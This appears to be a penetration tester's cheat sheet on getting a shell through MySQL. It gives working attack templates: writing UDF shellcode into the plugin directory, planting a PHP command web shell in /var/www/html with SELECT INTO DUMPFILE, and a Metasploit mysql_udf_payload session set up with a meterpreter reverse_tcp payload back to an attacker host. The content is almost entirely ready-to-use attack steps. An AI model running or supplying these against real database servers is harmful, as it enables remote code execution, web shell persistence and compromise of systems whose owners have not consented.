# MySQL

## 01 - Unix Shell

### UDF

> [!IMPORTANT] Conditions
> The DB user must have **FILE** and **SELECT** privileges.

```
set @shellcode = 0x<shellcode>

SELECT @@plugin_dir;

SELECT BINARY @shellcode INTO DUMPFILE '/path/to/from/plugin/directory/udf_sys_exec.so';
```

### Webshell

TODO: Replicate the methods from this video https://www.youtube.com/watch?v=FjgKtBAiLKQ

```sql
CREATE TABLE `<database_name>`.`user_input`(
`<column_name>` VARCHAR(1000) NOT NULL
) ENGINE = MYISAM;

INSERT INTO user_input values('<?php $cmd=$_GET["cmd"];system($cmd);?>')

SELECT * INTO DUMPFILE '/var/www/html/shell.php' FROM user_input;
```

## 02 - Metasploit

```
msf > use exploit/multi/mysql/mysql_udf_payload

msf exploit(multi/mysql/mysql_udf_payload) > options

Module options (exploit/multi/mysql/mysql_udf_payload): 

   Name              Current Setting  Required  Description 
   ----              ---------------  --------  ----------- 
   FORCE_UDF_UPLOAD  false            no        Always attempt to install a sys_exec() mysql.function. 
   PASSWORD                           no        The password for the specified username 
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit 
   RPORT             3306             yes       The target port (TCP) 
   SRVHOST           0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to l 
                                                isten on all addresses. 
   SRVPORT           8080             yes       The local port to listen on. 
   SSL               false            no        Negotiate SSL for incoming connections 
   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated) 
   URIPATH                            no        The URI to use for this exploit (default is random) 
   USERNAME          root             no        The username to authenticate as 


Payload options (linux/x86/meterpreter/reverse_tcp): 

   Name   Current Setting  Required  Description 
   ----   ---------------  --------  ----------- 
   LHOST                   yes       The listen address (an interface may be specified) 
   LPORT  4444             yes       The listen port 


Exploit target: 

   Id  Name 
   --  ---- 
   0   Windows 


msf exploit(multi/mysql/mysql_udf_payload) > set target Linux

msf exploit(multi/mysql/mysql_udf_payload) > set rhosts <IP>

msf exploit(multi/mysql/mysql_udf_payload) > set username <username>

msf exploit(multi/mysql/mysql_udf_payload) > set password <password>

msf exploit(multi/mysql/mysql_udf_payload) > set lhost <IP>

msf exploit(multi/mysql/mysql_udf_payload) > run
```